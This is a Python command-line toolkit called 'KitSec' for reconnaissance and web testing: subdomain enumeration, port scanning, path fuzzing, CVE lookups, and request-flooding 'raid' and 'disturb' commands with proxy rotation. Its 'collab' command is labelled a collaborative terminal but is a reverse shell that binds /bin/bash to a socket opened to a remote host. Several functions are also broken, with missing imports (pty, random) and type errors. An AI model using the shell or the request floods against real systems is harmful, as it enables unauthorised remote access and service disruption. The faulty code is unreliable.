import os
import time
import gzip
import socket
import ipwhois
import warnings
import subprocess
import urllib.parse
from typing import List
import hashlib


import requests
import paramiko
import ipaddress
import concurrent
import pandas as pd
from tqdm import tqdm
from bs4 import BeautifulSoup
from tabulate import tabulate
from urllib.parse import urlparse
from Wappalyzer import Wappalyzer, WebPage


import html
import json
import black
import magic
import click
import base64
import platform
import textwrap
import binascii



#fix enumerator's output when yessing both technology and requests.
#Add XSS scanner (https://github.com/s0md3v/XSStrike)

#add user agent rotation
#add proxy rotation


@click.group()
def cli():
    """
    KitSec - A CLI tool for security testing and reconnaissance.
    """
    pass


@click.command()
@click.option('--host', prompt='Enter the IP address of the VPS server to connect to')
@click.option('--username', prompt='Enter the limited user account to use for connecting to the VPS server')
@click.option('--password', prompt='Enter the password for the user account', hide_input=True)
def vps_logger(host, username, password):
    """
    Connects to a remote VPS server and tails the auth.log file.

    Returns:
    - Prints a continuous stream of output from the auth.log file to the console.

    The program attempts to connect to the specified VPS server using SSH, with the provided
    username and password. Once connected, it invokes a shell and sends the command to tail
    the auth.log file using sudo. It then continuously checks for new output from the file and
    prints it to the console as it is received.
    """
    # Create an SSH client object and set the missing host key policy to auto add
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    # Connect to the VPS server using the provided host, username, and password
    ssh.connect(host, username=username, password=password)
    
    # Invoke a shell and send the command to tail the auth.log file using sudo
    channel = ssh.invoke_shell()
    channel.send('sudo tail -f /var/log/auth.log\n')
    
    # Continuously check for new output from the auth.log file and print it to the console
    while True:
        if channel.recv_ready():
            output = channel.recv(1024).decode('utf-8')
            click.echo(output, nl=False)


@click.command()
@click.argument('host')
@click.argument('port')
def collab(host, port):
    """
    Connects to a remote machine and starts a collaborative terminal.

    Args:
    - host (str): The IP address or hostname of the remote machine.
    - port (int): The port to connect to on the remote machine.

    Returns:
    - None. Starts a collaborative terminal session with the remote machine.

    The program attempts to connect to the specified remote machine on the specified port.
    If the connection is successful, it starts a new terminal session that is shared between
    the local machine and the remote machine. All input and output is echoed to both machines.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, int(port)))
        click.echo(f'Connected to {host}:{port}.')

        pty.spawn(['/bin/bash'], stdin=sock, stdout=sock, stderr=sock)

        click.echo('Terminal closed.')
    except socket.error as e:
        click.echo(f'Error connecting to {host}:{port}: {e}')



@click.command()
@click.argument('url')
def capture(url):
    """
    Captures the request headers for a given URL.

    Returns:
    - Prints a string containing the captured request headers, including method, hostname, path, cookies, and all other headers sent with the request.
    """
    # Make a request to the given URL and capture the request headers
    response = requests.get(url)
    headers = response.request.headers

    # Parse the URL to get the hostname and path
    parsed_url = urllib.parse.urlparse(url)
    hostname = parsed_url.hostname
    path = parsed_url.path

    # Construct the request info string
    request_info = f"{response.request.method} {path} HTTP/1.1\n"
    request_info += f"Host: {hostname}\n"
    
    cookie_lines = headers.get("Cookie", "").split("; ")
    cookies = "\n".join(cookie_lines)
    request_info += f"Cookie: {cookies}\n"
    
    request_info += "\n".join([f"{header}: {value}" for header, value in headers.items() if header not in ["Host", "User-Agent", "Cookie"]])
    request_info += "\n\n"
    
    # Add response headers
    request_info += "Response headers:\n"
    request_info += textwrap.indent("\n".join([f"  {header}: {value}" for header, value in response.headers.items()]), "  ")
    request_info += "\n"
    
    print(request_info)



@click.command()
@click.argument('data')
@click.option('--type', '-t', 'transformation_type', type=click.Choice(['URL', 'HTML', 'Base64', 'ASCII', 'Hex', 'Octal', 'Binary', 'MD5', 'SHA1', 'SHA256', 'BLAKE2B-160', 'GZIP']), default='Base64')
def convert(data, transformation_type):
    """
    Applies a specified decoding or hashing function to input data.

    Returns:
    - The transformed input data as a string.

    If the input data is text, the program will apply the specified transformation type, then return the result.
    If the input data is binary, the program will apply the specified hashing function and return the resulting hash.
    If an invalid transformation type is specified, the program will return an error message.
    """
    detected_type = magic.from_buffer(data, mime=True)
    
    if detected_type.startswith('text'):
        if transformation_type == "URL":
            result = urllib.parse.unquote(data)
        elif transformation_type == "HTML":
            result = html.unescape(data)
        elif transformation_type == "Base64":
            decoded_bytes = base64.b64decode(data)
            result = decoded_bytes.decode('utf-8')
        elif transformation_type == "ASCII":
            try:
                result = bytearray.fromhex(data).decode()
            except ValueError:
                result = "Invalid ASCII input"
        elif transformation_type == "Hex":
            try:
                result = bytes.fromhex(data).decode('utf-8')
            except ValueError:
                result = "Invalid hex input"
        elif transformation_type == "Octal":
            try:
                result = ''.join([chr(int(octet, 8)) for octet in data.split()])
            except ValueError:
                result = "Invalid octal input"
        elif transformation_type == "Binary":
            try:
                result = ''.join([chr(int(octet, 2)) for octet in data.split()])
            except ValueError:
                result = "Invalid binary input"
        elif transformation_type == "GZIP":
            try:
                decoded = gzip.decompress(data)
                result = decoded.decode('utf-8')
            except Exception:
                result = "Invalid GZIP input"
        else:
            result = "Invalid decoding or hashing type"
    else:
        if transformation_type == "MD5":
            result = hashlib.md5(data).hexdigest()
        elif transformation_type == "SHA1":
            result = hashlib.sha1(data).hexdigest()
        elif transformation_type == "SHA256":
            result = hashlib.sha256(data).hexdigest()
        elif transformation_type == "BLAKE2B-160":
            result = hashlib.blake2b(data, digest_size=20).hexdigest()
        else:
            result = "Invalid decoding or hashing type"

    click.echo(result)



def shuffle(url):
    """
    Sends a GET request to the provided URL with shuffled proxies, ports, user agents,
    and headers.

    Args:
    - url (str): The URL to send the GET request to.

    Returns:
    - If the GET request is successful, returns the response text. Otherwise, returns None.

    The function shuffles a list of proxies, ports, user agents, and headers, and selects
    the first shuffled item for each parameter. It then creates a dictionary of shuffled proxy
    and header parameters and sends a GET request to the provided URL with these parameters.
    If the GET request is successful, the function returns the response text. Otherwise,
    it returns None.
    """
    # Define proxies, ports, user agents, and headers to shuffle
    proxies = ['1.2.3.4:8080', '5.6.7.8:3128', '9.10.11.12:80']
    ports = ['80', '8080', '3128']
    user_agents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
                   'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0']
    headers = {'Accept-Language': 'en-US,en;q=0.5', 'Connection': 'keep-alive'}

    # Shuffle the proxies, ports, user agents, and headers
    random.shuffle(proxies)
    random.shuffle(ports)
    random.shuffle(user_agents)
    random.shuffle(headers)
    
    # Select the first shuffled item for each parameter
    proxy = proxies[0]
    port = ports[0]
    user_agent = user_agents[0]
    header = headers[0]
    
    # Create dictionary of shuffled proxy and header parameters
    proxies_dict = {'http': f'http://{proxy}:{port}', 'https': f'https://{proxy}:{port}'}
    headers_dict = {'User-Agent': user_agent, **header}
    
    # Send GET request with shuffled parameters and handle exceptions
    try:
        response = requests.get(url, proxies=proxies_dict, headers=headers_dict)
        response.raise_for_status()
        return response.text
    except (requests.exceptions.RequestException, ValueError):
        return None




def passive_enumerator(domain):
    """
    Uses multiple tools to passively enumerate subdomains for a given domain.

    Args:
        domain (str): The domain to enumerate subdomains for.

    Returns:
        set: A set of subdomains.
    """
    # Initialize set to store subdomains
    subdomains = set()

    # Enumerate using Subfinder
    try:
        print('Enumerating using Subfinder...')
        with open(os.devnull, 'w') as nullfile:
            output = subprocess.check_output(['subfinder', '-d', domain], stderr=nullfile)
        subdomains.update(output.decode('utf-8').strip().split('\n'))
    except:
        print('Subfinder is not installed or encountered an error, skipping..."')

    # Enumerate using Findomain
    try:
        print('Enumerating using Findomain...')
        with open(os.devnull, 'w') as nullfile:
            output = subprocess.check_output(['findomain', '-t', domain], stderr=nullfile)
        subdomains.update(output.decode('utf-8').strip().split('\n')[1:])
        subdomains = set([x for x in subdomains if domain in x])
    except:
        print('Findomain is not installed or encountered an error, skipping..."')

    # Enumerate using Assetfinder
    try:
        print('Enumerating using Assetfinder...')
        with open(os.devnull, 'w') as nullfile:
            output = subprocess.check_output(['assetfinder', '--subs-only', domain], stderr=nullfile)
        subdomains.update([s.split('.')[0] for s in output.decode('utf-8').strip().split('\n')])
    except:
        print('Assetfinder is not installed or encountered an error, skipping..."')

    # Enumerate using Amass
    try:
        print('Enumerating using Amass...')
        with open(os.devnull, 'w') as nullfile:
            output = subprocess.check_output(['amass', 'enum', '--passive', '-d', domain], stderr=nullfile)
        subdomains.update([s.split('.')[0] + '.' + domain for s in output.decode('utf-8').strip().split('\n')])
    except:
        print('Amass is not installed or encountered an error, skipping... / debug by running "amass enum --passive -d example.com"')

    # Enumerate using waybackurls
    try:
        print('Enumerating using waybackurls...')
        with open(os.devnull, 'w') as nullfile:
            output = subprocess.check_output(['waybackurls', domain], stderr=nullfile)
        subdomains.update([urlparse(url).hostname for url in output.decode('utf-8').strip().split('\n')])
    except:
        print('waybackurls is not installed or encountered an error, skipping... / debug by running "waybackurls example.com"')

    # Remove duplicates from set of subdomains
    subdomains = set(subdomains)

    # Return set of subdomains
    return subdomains




def active_enumerator(domain):
    """
    Enumerates subdomains for a given domain, and checks which ones are active.
    Args:
        domain (str): The domain to enumerate subdomains for.
    Returns:
        set or None: A set of subdomains, or None if no subdomains were found.
    """
    subdomains = set()
    
    # Check if subdomains directory exists
    dir_path = "../lists/active_enumerator"
    if not os.path.isdir(dir_path):
        raise FileNotFoundError(f"Subdomains directory '{dir_path}' not found")
    
    # Get list of subdomain files in directory
    file_names = [file_name for file_name in os.listdir(dir_path) if os.path.isfile(os.path.join(dir_path, file_name)) and file_name.endswith(".txt")]
    total_files = len(file_names)
    
    # Enumerate subdomains from each file and check if active
    for i, file_name in enumerate(file_names):
        file_path = os.path.join(dir_path, file_name)
        with open(file_path, "r") as subdomain_file:
            for line in tqdm(subdomain_file, desc="Active enumeration", unit="Subdomains"):
                subdomain = line.strip()
                full_domain = subdomain + "." + domain
                try:
                    # Send a HEAD request to check if the subdomain is active
                    response = requests.head("https://" + full_domain, timeout=3)
                    if response.status_code < 400:
                        subdomains.add(subdomain)
                
                # Ignore exceptions and continue to the next subdomain
                except:
                    pass
    
    # Return set of active subdomains or empty set if none were found
    if subdomains:
        return subdomains
    else:
        return set()


def fetch_response(subdomains: List[str], technology: bool) -> List[List[str]]:
    """
    Fetches the HTTP response codes and reasons for a list of subdomains.

    Args:
    - subdomains (List[str]): A list of subdomains to fetch responses for.
    - technology (bool): Whether to also fetch the technologies used by each subdomain.

    Returns:
    - A list of lists, where each sub-list contains the following fields for a subdomain:
      - Subdomain name (str)
      - HTTP status code (int)
      - HTTP status reason (str)
      - List of technologies used by the subdomain (if technology is True), or an empty string (if technology is False).
    """
    # Initialize empty response table and create a session object for TCP connection reuse
    response_table = []
    session = requests.Session()
    
    # Fetch response for each subdomain in the list
    for subdomain in tqdm(subdomains, desc='Fetching response', unit='subdomain', leave=False):
        try:
            # Make HTTP GET request with timeout of 5 seconds
            response = session.get(f'http://{subdomain}', timeout=5)
            response_table.append([subdomain, response.status_code, response.reason, ''])
            
            # Add a delay of 0.5 seconds to avoid overloading the target website
            time.sleep(0.5)
        
        # Handle timeout and connection errors
        except requests.exceptions.Timeout:
            print(f"Skipped '{subdomain}'")
            continue
        except requests.exceptions.ConnectionError:
            print(f"Skipped '{subdomain}'")
            continue
        
        # Handle other exceptions
        except Exception as e:
            print(f"Skipped '{subdomain}': {str(e)}")
            continue
    
    # Return response table
    return response_table



def fetch_tech(url):
    """
    Fetches the technologies used by a website using Wappalyzer.

    Args:
    - url (str): The URL of the website to analyze.

    Returns:
    - A list of strings representing the technologies used by the website.
    - If an error occurs while fetching the technologies, returns None.
    """
    # Ignore JAVA warnings on wappalyzer & skip
    warnings.filterwarnings("ignore", category=UserWarning, module='bs4')
    warnings.filterwarnings("ignore", category=UserWarning, message=".*It looks like you're parsing an XML document using an HTML parser.*")
    warnings.filterwarnings("ignore", message="""Caught 'unbalanced parenthesis at position 119' compiling regex""", category=UserWarning )

    # Ensure URL starts with http(s)
    if not url.startswith('http'):
        url = 'https://' + url

    # Fetch web page and analyze with Wappalyzer
    technologies = []
    
    # Print only once when the function is launched
    if not hasattr(fetch_tech, 'counter'):
        fetch_tech.counter = 0
    if fetch_tech.counter == 0:
        print("Fetching technologies...")
        fetch_tech.counter += 1
    
    # Retry fetching up to 5 times in case of error
    max_retries = 5
    retry_count = 0
    while retry_count < max_retries:
        try:
            # Create WebPage object and analyze with Wappalyzer
            webpage = WebPage.new_from_url(url)
            wappalyzer = Wappalyzer.latest()
            for tech in wappalyzer.analyze(webpage):
                technologies.append(tech)
            return technologies
        
        # Handle timeout and connection errors
        except requests.exceptions.Timeout:
            return None
        except requests.exceptions.ConnectionError:
            return None
        
        # Handle other exceptions
        except Exception:
            retry_count += 1
            if retry_count < max_retries:
                time.sleep(5)
    
    # Max retries reached, return None
    return None



@click.command()
@click.option('-r', '--request', is_flag=True, help='Test subdomains and print http response for active ones')
@click.option('-t', '--technology', is_flag=True, help='Analyze technology used by subdomains')
@click.option('-a', '--active', is_flag=True, help='Use active subdomain enumeration')
@click.argument('domain')
def enumerator(request, technology, active, domain):
    """
    Enumerates subdomains for a given domain using Subfinder and active enumeration.
    """
    # Get subdomains using Subfinder
    subdomains = passive_enumerator(domain)

    if active:
        # Enumerate subdomains using active enumeration
        active_subdomains = active_enumerator(domain)
        # Add the active subdomains to the set of subdomains
        subdomains.update(active_subdomains)

    if request and not technology:
        # Test subdomains and print http response for active ones
        response_table = fetch_response(subdomains, False)
        # sort response_table by status in ascending order
        response_table = sorted(response_table, key=lambda x: x[1])
        click.echo(tabulate(response_table, headers=['Subdomain', 'Status', 'Reason']))

    if technology and not request:
        # Analyze technology used by subdomains
        tech_table = []
        for subdomain in subdomains:
            tech = fetch_tech(subdomain)
            tech_table.append([subdomain, tech])
        click.echo(tabulate(tech_table, headers=['Subdomain', 'Technology']))

    if request and technology:
        # Test subdomains and print http response for active ones
        response_table = fetch_response(subdomains, True)
        # sort response_table by status in ascending order
        response_table = sorted(response_table, key=lambda x: x[1])

        # Analyze technology used by subdomains
        tech_table = []
        for subdomain in subdomains:
            tech = fetch_tech(subdomain)
            tech_table.append([subdomain, tech])

        # Combine the two tables into a single table
        response_df = pd.DataFrame(response_table, columns=['Subdomain', 'Status', 'Reason', 'Technology'])
        tech_df = pd.DataFrame(tech_table, columns=['Subdomain', 'Technology'])
        combined_df = pd.merge(response_df, tech_df, on='Subdomain', how='outer')
        combined_df.fillna('', inplace=True)  # replace NaN values with empty string
        combined_table = combined_df.to_records(index=False).tolist()

        click.echo(tabulate(combined_table, headers=['Subdomain', 'Status', 'Reason', 'Technology']))

    if not request and not technology:
        # Just print the subdomains
        subdomains_list = list(subdomains)
        with tqdm(total=len(subdomains_list), desc='Enumerating subdomains', unit='subdomain') as pbar:
            subdomains_list = [[subdomain] for subdomain in subdomains_list]
            click.echo(tabulate(subdomains_list, headers=['Subdomain']))
            pbar.update(len(subdomains_list))



@click.command()
@click.argument('url', required=True)
@click.option('-m', '--method', default='GET', help='HTTP method to use')
@click.option('-p', '--payload', default='', help='Payload to include in the request body')
@click.option('-H', '--headers', default='', help='Headers to include in the request')
@click.option('-c', '--cookies', default='', help='Cookies to include in the request')
@click.option('-n', '--count', default=1, type=int, help='Number of times to repeat the request')
def disturb(url, method, payload, headers, cookies, count):
    """
    Sends multiple HTTP requests to the specified URL with the same payload.

    Returns:
    - A list of HTTP responses for each request sent.

    The program sends multiple HTTP requests to the specified URL using the provided HTTP method, payload,
    headers, and cookies. The user can also specify the number of times to repeat the request. The program
    returns a list of HTTP responses for each request sent.
    """
    responses = []
    for i in range(count):
        response = requests.request(method, url, data=payload, headers=headers, cookies=cookies)
        responses.append(response)
    return responses



@click.command()
@click.argument('url', type=str)
@click.option('--num-threats', '-t', type=int, default=6, help='Number of parallel threats to send requests from.')
@click.option('--num-requests', '-r', type=int, default=200, help='Number of requests to send from each threat.')
@click.option('--num-retries', '-y', type=int, default=4, help='Number of times to retry failed requests.')
@click.option('--pause-before-retry', '-p', type=int, default=3000, help='Number of milliseconds to wait before retrying a failed request.')
def raid(url, num_threats, num_requests, num_retries, pause_before_retry):
    """
    Sends HTTP requests to a given URL with a specified number of threats and requests.
    """
    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'https://' + url
    prepared_request = requests.Request('GET', url).prepare()
    results = []
    with requests.Session() as session:
        adapter = requests.adapters.HTTPAdapter(max_retries=num_retries)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        pool = session.send
        for i in range(num_threats):
            threat_results = []
            with tqdm(total=num_requests, desc=f'Threat {i+1}') as pbar:
                for j in range(num_requests):
                    response = pool(prepared_request)
                    threat_results.append(response)
                    if response.status_code == 200:
                        break
                    time.sleep(pause_before_retry/1000)
                    pbar.update(1)
            results.append(threat_results)
    click.echo(results)



@click.command()
@click.argument('url')
@click.option('-c', '--common-ports', is_flag=True, help='Scan only the most common HTTP ports (80, 8080, and 443)')
def portscan(url, common_ports):
    """
    Performs a TCP port scan on a specified hostname or URL and a range of ports.

    Args:
    - url (str): The hostname or URL of the target host.

    Options:
    - common-ports (bool): Whether to scan only the most common HTTP ports (80, 8080, and 443).

    Returns:
    - None. Prints the open ports found on the target host.
    """
    # Add a scheme to the URL if it is not present
    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'https://' + url

    # Parse the URL to extract the hostname
    hostname = urlparse(url).hostname or url

    # Resolve the hostname to an IP address
    ip_address = socket.gethostbyname(hostname)

    open_ports = []

    # Define a function to scan a single port
    def scan_port(port):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.1)
        try:
            sock.connect((ip_address, port))
            open_ports.append(f"{hostname}:{port}")
        except:
            pass
        finally:
            sock.close()

    # Scan only the most common HTTP ports if the --common-ports flag is set
    if common_ports:
        ports = [80, 8080, 443]
    else:
        ports = range(1, 65536)

    # Use multi-threading to scan ports in parallel
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        futures = [executor.submit(scan_port, port) for port in ports]
        with tqdm(total=len(futures), desc="Scanning Ports", unit="ports") as progress:
            for future in concurrent.futures.as_completed(futures):
                progress.update(1)

    # Print the open ports
    click.echo('\nOpen Ports:')
    for port in open_ports:
        click.echo(port)




@click.command()
@click.argument('base_url')
@click.option('-p', '--path', default='../lists/injector', help='The path to a file or directory containing a list of paths to send requests to. Default: ../lists/injector')
def inject(base_url, path):
    """
    Sends HTTP GET requests to a specified base URL with a given list of paths.

    Args:
    - base_url (str): The base URL to send requests to. The URL must include the protocol (http or https).

    Options:
    - path (str): The path to a file or directory containing a list of paths to send requests to. Default: ../lists/injector

    Returns:
    - None. For each request sent, the program will print the URL and response code to the console if the response code is 200.
    """

    # Add http or https prefix if missing
    if not base_url.startswith('http'):
        base_url = 'http://' + base_url

    # Check if the path is a directory or a file
    if os.path.isdir(path):
        # If the path is a directory, iterate through each file in the directory
        for filename in os.listdir(path):
            filepath = os.path.join(path, filename)
            if os.path.isfile(filepath):
                # If the file is a regular file, read each line in the file and send a request to the URL
                with open(filepath) as f:
                    paths = f.read().splitlines()
                    progress_bar = tqdm(paths, desc=filename, position=0, leave=True)
                    for p in progress_bar:
                        url = f"{base_url}/{p}"
                        response = requests.get(url)
                        # If the response code is 200, print the URL and response code to the console
                        if response.status_code == 200:
                            click.echo(f"{url} - {response.status_code}")
    elif os.path.isfile(path):
        # If the path is a regular file, read each line in the file and send a request to the URL
        with open(path) as f:
            paths = f.read().splitlines()
            progress_bar = tqdm(paths, desc=os.path.basename(path), position=0, leave=True)
            for p in progress_bar:
                url = f"{base_url}/{p}"
                response = requests.get(url)
                # If the response code is 200, print the URL and response code to the console
                if response.status_code == 200:
                    click.echo(f"{url} - {response.status_code}")
    else:
        # If the path does not exist, print an error message to the console
        click.echo(f"{path} does not exist")




def fetch_cwe(cwe_code):
    """Fetches the CWE name given a CWE code.

    :param cwe_code: The CWE code to fetch the name for.
    :type cwe_code: str
    :return: The name of the CWE.
    :rtype: str
    """
    # Construct the URL for the CWE code
    cwe_url = f"https://cwe.mitre.org/data/definitions/{cwe_code[4:].lower()}.html"

    # Send a GET request to the URL and parse the HTML response with BeautifulSoup
    response = requests.get(cwe_url)
    soup = BeautifulSoup(response.text, 'html.parser')

    # Extract the CWE name from the page title
    cwe_title = soup.find('title').text.strip()
    cwe_name = cwe_title.split(':')[1].strip()

    # Return the CWE code and name as a formatted string
    return f"{cwe_code}: {cwe_name}"



@click.command()
@click.argument('product_name')
@click.option('--limit', '-l', type=int, default=10, help='Number of results to display (default=10)')
def cve(product_name, limit):
    """
    Retrieve CVE data for a specific product name (company name) and display it in a clean format.

    Args:
    - product_name (str): The product name (company name) to search for.

    Options:
    - limit (int): Number of results to display (default=10).

    Returns:
    - None. Prints the retrieved CVE data in a table format.
    """
    # Make request to the NVD API and extract relevant fields
    url = f"https://services.nvd.nist.gov/rest/json/cves/1.0?keyword={product_name}&resultsPerPage={limit}"
    response = requests.get(url)
    data = response.json()
    cve_items = data.get("result", {}).get("CVE_Items", [])

    # Prepare the data to be displayed in a table format
    table_data = []
    for item in cve_items:
        # Extract CVE ID, severity, and summary fields
        cve_id = item.get("cve", {}).get("CVE_data_meta", {}).get("ID")
        severity = item.get("impact", {}).get("baseSeverity", "Unknown")
        if severity == "Unknown":
            severity_msg = "Severity information not available"
        else:
            severity_msg = severity
        summary = item.get("cve", {}).get("description", {}).get("description_data", [])
        summary = next((x.get("value") for x in summary if x.get("lang") == "en"), "")

        # Extract CWE information and append it to the data
        cwe_nodes = item.get("cve", {}).get("problemtype", {}).get("problemtype_data", [])
        cwe_codes = [n.get("description", [{}])[0].get("value", "") for n in cwe_nodes if n.get("description")]
        for cwe_code in cwe_codes:
            cwe_name = fetch_cwe(cwe_code)
            table_data.append(["CVE ID", cve_id])
            table_data.append(["CWE", cwe_name])
            table_data.append(["Severity", severity_msg])
            table_data.append(["Summary", summary])
            table_data.append(["", ""])  # Add an empty row for spacing
    
    # Display the data in a table format
    headers = ["", ""]
    click.echo(tabulate(table_data, headers=headers, tablefmt="plain"))



@click.command()
@click.argument('company_name')
def cidr(company_name):
    """
    Look up the CIDR range for a company's domain name.
    """
    try:
        # Look up the IP address for the company's domain name
        ip_address = socket.gethostbyname(company_name)

        # Look up the RDAP record for the IP address
        rdap_record = ipwhois.IPWhois(ip_address).lookup_rdap()

        # Extract the CIDR range from the RDAP record
        cidr_range = rdap_record['network']['cidr']

        click.echo(f"The CIDR range for {company_name} is {cidr_range}")

    except Exception as e:
        click.echo(f"Error: {str(e)}")


cli.add_command(vps_logger)
cli.add_command(collab)
cli.add_command(capture)
cli.add_command(convert)
cli.add_command(enumerator)
cli.add_command(disturb)
cli.add_command(raid)
cli.add_command(portscan)
cli.add_command(inject)
cli.add_command(cve)
cli.add_command(cidr)


if __name__ == '__main__':
    cli()